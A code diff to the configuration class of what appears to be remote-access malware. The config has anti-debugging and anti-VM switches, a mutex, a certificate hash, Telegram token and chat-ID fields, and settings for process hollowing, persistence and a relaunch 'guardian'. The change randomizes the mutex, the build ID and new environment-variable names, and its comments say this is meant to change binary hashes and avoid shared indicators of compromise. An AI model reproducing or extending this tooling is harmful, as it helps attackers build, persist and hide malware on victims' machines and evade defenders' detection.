@@ -5,7 +5,7 @@ internal static class Config
     public static readonly string[] Hosts = new[] { "localhost" };
     public const int Port = 5555;
     public const bool UseMutex = true;
-    public const string MutexName = "Global\\a07982992aa9471ab520066174bb84b4";
+    public const string MutexName = "Global\\2063dbf3d69548aeb5901ab22b3af5c3";
 
     public const bool AntiDebug = false;
     public const bool AntiVM = false;
@@ -28,7 +28,14 @@ internal static class Config
     public const string CertHash = "07AAB3993AEFC4F6B065B04E1EDA9E20E14649C3852D7079A852B421534AB423";
 
     // Unique per build — changes the compiled binary hash even with identical settings
-    public const string BuildId = "1c7c7629144846a28ede871b4d784f9e";
+    public const string BuildId = "bc87c60a010349c7ae2f73f958e15348";
+
+    // Per-build env var names — randomized so no two builds share the same IoC strings
+    public const string EnvKeyHollow        = "__SERO_H__";
+    public const string EnvKeyPersistWorker = "SERO_PERSIST_WORKER";
+    public const string EnvKeyRelaunch      = "SERO_RELAUNCH";
+    public const string EnvKeyExe           = "SERO_EXE";
+    public const string EnvKeyGuardian      = "SERO_GUARDIAN";
 
     public const int ReconnectDelayMs = 5000;
     public const int HeartbeatIntervalMs = 3000;
@@ -49,5 +56,5 @@ internal static class Config
     public static readonly byte[] TelegramTokenSfc   = new byte[] {  };
     public static readonly byte[] TelegramChatId1Sfc = new byte[] {  };
     public static readonly byte[] TelegramChatId2Sfc = new byte[] {  };
-    public static readonly byte[] TelegramSfcSeed    = new byte[] { 190, 170, 80, 67, 124, 158, 216, 101, 201, 76, 22, 83, 196, 79, 8, 7, 236, 77, 170, 127, 216, 169, 246, 213, 206, 164, 15, 205, 40, 59, 213, 139 };
+    public static readonly byte[] TelegramSfcSeed    = new byte[] { 155, 103, 124, 249, 27, 190, 148, 143, 42, 214, 128, 146, 6, 248, 58, 29, 10, 179, 29, 134, 224, 212, 96, 246, 225, 190, 210, 16, 244, 234, 12, 97 };
 }
